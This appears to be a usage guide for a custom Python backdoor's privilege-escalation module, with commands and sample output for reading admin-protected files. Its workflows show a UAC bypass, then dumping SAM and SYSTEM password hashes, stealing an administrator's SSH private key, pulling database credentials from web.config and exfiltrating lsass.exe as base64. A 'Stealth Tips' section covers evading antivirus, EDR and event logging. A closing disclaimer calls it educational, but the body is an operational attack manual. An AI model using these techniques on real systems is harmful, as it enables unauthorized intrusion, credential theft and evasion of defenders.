# Admin File Access Guide

## Overview

The backdoor now includes enhanced privilege escalation features that allow reading admin-protected files and directories. These commands automatically attempt multiple methods to access protected resources, including privilege elevation if needed.

## New Commands

### 1. Read Admin-Protected Text Files

```bash
priv_read_file <file_path>
```

**Purpose:** Read text files that require administrator privileges.

**How it works:**

1. Attempts direct file read
2. If permission denied, tries PowerShell (Windows)
3. Falls back to shell commands (type/cat)
4. Provides detailed error messages with suggestions

**Example - Windows:**

```bash
# Read SAM file (password hashes)
priv_read_file C:\Windows\System32\config\SAM

# Read protected registry export
priv_read_file C:\Windows\System32\config\SYSTEM

# Read IIS configuration
priv_read_file C:\inetpub\wwwroot\web.config

# Read Event Logs (exported)
priv_read_file C:\Windows\System32\winevt\Logs\Security.evtx
```

**Example - Linux/macOS (when support is added):**

```bash
# Read shadow file
priv_read_file /etc/shadow

# Read sudoers file
priv_read_file /etc/sudoers

# Read SSH keys
priv_read_file /root/.ssh/id_rsa
```

**Response:**

```
[+] File read successfully using powershell
[+] File: C:\Windows\System32\config\SAM
[+] Content length: 262144 characters
============================================================
SAM file content here...
============================================================
```

**If permission denied:**

```
[-] Failed to read file: Permission denied - admin privileges required

Note: Not running as admin. Try:
1. Run 'priv_uac_bypass' to attempt elevation
2. Run backdoor as administrator
3. Use 'priv_check' to verify admin status
```

---

### 2. Read Admin-Protected Binary Files

```bash
priv_read_binary <file_path>
```

**Purpose:** Read binary files (executables, DLLs, databases) that require admin privileges. Returns base64-encoded content for safe transmission.

**How it works:**

1. Attempts direct binary read
2. Falls back to PowerShell base64 encoding (Windows)
3. Returns content as base64 string

**Example:**

```bash
# Read protected executable
priv_read_binary C:\Windows\System32\lsass.exe

# Read database file
priv_read_binary C:\Program Files\Database\data.db

# Read protected DLL
priv_read_binary C:\Windows\System32\ntdll.dll
```

**Response:**

```
[+] Binary file read successfully using powershell_binary
[+] File: C:\Windows\System32\ntdll.dll
[+] File size: 2048576 bytes
[+] Base64 length: 2731436 characters
============================================================
Base64 Content (first 500 chars):
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v...
... (2730936 more characters)
============================================================
```

**Use case:** Download protected system files for analysis

**Decoding the content:**

```python
import base64

# Decode base64 back to binary
base64_content = "TVqQAAMAAAAEAAAA..."  # From the response
binary_content = base64.b64decode(base64_content)

# Save to file
with open('downloaded_file.dll', 'wb') as f:
    f.write(binary_content)
```

---

### 3. List Admin-Protected Directories

```bash
priv_list_dir <directory_path>
```

**Purpose:** List contents of directories that require administrator privileges.

**How it works:**

1. Attempts direct directory listing with os.listdir
2. Falls back to shell commands (dir/ls)
3. Shows files, directories, and sizes

**Example - Windows:**

```bash
# List Windows System32 folder
priv_list_dir C:\Windows\System32

# List Program Files
priv_list_dir C:\Program Files

# List user profile folders
priv_list_dir C:\Users\Administrator

# List hidden admin folders
priv_list_dir C:\Windows\System32\config
```

**Example - Linux/macOS:**

```bash
# List /root directory
priv_list_dir /root

# List /etc/ssh
priv_list_dir /etc/ssh

# List protected logs
priv_list_dir /var/log
```

**Response:**

```
[+] Directory listed successfully using direct_listing
[+] Directory: C:\Windows\System32
[+] Directories: 45, Files: 2847
============================================================
DIRECTORIES:
  [DIR]  DriverStore
  [DIR]  config
  [DIR]  drivers
  [DIR]  Tasks
  [DIR]  winevt
  ... and 40 more directories

FILES:
  [FILE] ntdll.dll (2048576 bytes)
  [FILE] kernel32.dll (1024000 bytes)
  [FILE] user32.dll (1536000 bytes)
  [FILE] advapi32.dll (819200 bytes)
  ... and 2843 more files
============================================================
```

---

## Complete Workflow Examples

### Scenario 1: Extracting Windows Password Hashes

```bash
# Step 1: Check if you have admin access
> priv_check

Response:
{
  "system": "Windows",
  "is_admin": false,
  "user": "john",
  "integrity_level": "Medium (Standard User)"
}

# Step 2: Attempt UAC bypass to gain admin
> priv_uac_bypass

Response: UAC bypass attempts: fodhelper.exe executed, ComputerDefaults.exe executed

# Step 3: Re-check admin status
> priv_check

Response:
{
  "is_admin": true,  # Success!
  "integrity_level": "High (Admin)"
}

# Step 4: Read SAM file (password hashes)
> priv_read_file C:\Windows\System32\config\SAM

Response:
[+] File read successfully using direct_read
[+] Content: [SAM file contents with password hashes]

# Step 5: Read SYSTEM file (needed to decrypt SAM)
> priv_read_file C:\Windows\System32\config\SYSTEM

Response:
[+] File read successfully
[+] Content: [SYSTEM file contents]

# Now you can use tools like samdump2 or mimikatz to extract passwords
```

### Scenario 2: Stealing SSH Keys from Admin Account

```bash
# Step 1: List admin's .ssh directory
> priv_list_dir C:\Users\Administrator\.ssh

Response:
[+] Directory listed successfully
FILES:
  [FILE] id_rsa (3243 bytes)
  [FILE] id_rsa.pub (743 bytes)
  [FILE] known_hosts (1024 bytes)

# Step 2: Read private SSH key
> priv_read_file C:\Users\Administrator\.ssh\id_rsa

Response:
[+] File read successfully
============================================================
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2xKJ9...
[Private key content]
-----END RSA PRIVATE KEY-----
============================================================

# Step 3: Save the key and use for authentication
```

### Scenario 3: Reading IIS Web Configuration (Credentials)

```bash
# List IIS directory
> priv_list_dir C:\inetpub\wwwroot

# Read web.config (contains database credentials)
> priv_read_file C:\inetpub\wwwroot\web.config

Response:
[+] File read successfully
============================================================
<?xml version="1.0"?>
<configuration>
  <connectionStrings>
    <add name="DefaultConnection"
         connectionString="Server=db-server;Database=webapp;
         User Id=db_admin;Password=SecurePass123!;" />
  </connectionStrings>
</configuration>
============================================================

# Now you have database credentials!
```

### Scenario 4: Downloading Protected Executable for Analysis

```bash
# Read protected system file as binary
> priv_read_binary C:\Windows\System32\lsass.exe

Response:
[+] Binary file read successfully
[+] File size: 46592 bytes
[+] Base64 content: TVqQAAMAAAAEAAAA...

# Copy the base64 content and decode on attacker machine:
# echo "TVqQAAMAAAAEAAAA..." | base64 -d > lsass.exe
```

---

## Troubleshooting

### Issue: "Permission denied - admin privileges required"

**Solution 1: Attempt UAC bypass**

```bash
priv_uac_bypass
# Wait a few seconds
priv_check  # Verify elevation
priv_read_file <file>  # Try again
```

**Solution 2: Run backdoor as administrator**

On target machine:

```bash
# Right-click Python and "Run as administrator"
# Or from elevated command prompt:
python backdoor.py
```

**Solution 3: Use alternative access methods**

Some files may be accessible through:

- Registry exports
- Event log queries
- WMI queries
- PowerShell cmdlets

### Issue: "File not found"

Verify the file path:

```bash
# List parent directory first
priv_list_dir C:\Windows\System32

# Check if file exists
dir C:\Windows\System32\config\SAM
```

### Issue: "Running as admin but still cannot access file"

Some files are protected by additional security:

- **TrustedInstaller ownership**: Use `takeown` and `icacls` commands
- **File in use**: May need to stop services or reboot
- **Encrypted files**: Require decryption keys
- **System protection**: May be blocked by security software

---

## Security Considerations

### Detection Risks

These commands may trigger:

- **Antivirus/EDR alerts** when accessing protected files
- **SIEM alerts** for sensitive file access
- **Windows Event Logs** (EventID 4663: Object Access)
- **PowerShell logging** if script block logging is enabled

### Stealth Tips

1. **Check current privileges first**: `priv_check`
2. **List directory before reading**: Verify file exists
3. **Read small files first**: Test access without large transfers
4. **Use binary read for sensitive files**: Avoid logging as text
5. **Clean up after UAC bypass**: Registry keys are created/deleted but may leave traces

---

## Command Reference Summary

| Command                   | Purpose                   | Admin Required | Platform |
| ------------------------- | ------------------------- | -------------- | -------- |
| `priv_read_file <path>`   | Read text file            | Sometimes\*    | Windows  |
| `priv_read_binary <path>` | Read binary file (base64) | Sometimes\*    | Windows  |
| `priv_list_dir <path>`    | List directory contents   | Sometimes\*    | Windows  |
| `priv_check`              | Check admin status        | No             | Windows  |
| `priv_uac_bypass`         | Attempt elevation         | No             | Windows  |

\*Automatically attempts elevation if needed

---

## Future Enhancements

Planned features:

- [ ] Linux/macOS support for admin file access
- [ ] Automatic file download after reading
- [ ] Recursive directory listing
- [ ] File search by pattern in admin directories
- [ ] Registry key reading for protected hives
- [ ] Memory dump reading (lsass process)
- [ ] Volume Shadow Copy access

---

**WARNING: For Educational Purposes Only!**

Use these features only in authorized penetration testing environments. Unauthorized access to admin-protected files is illegal.
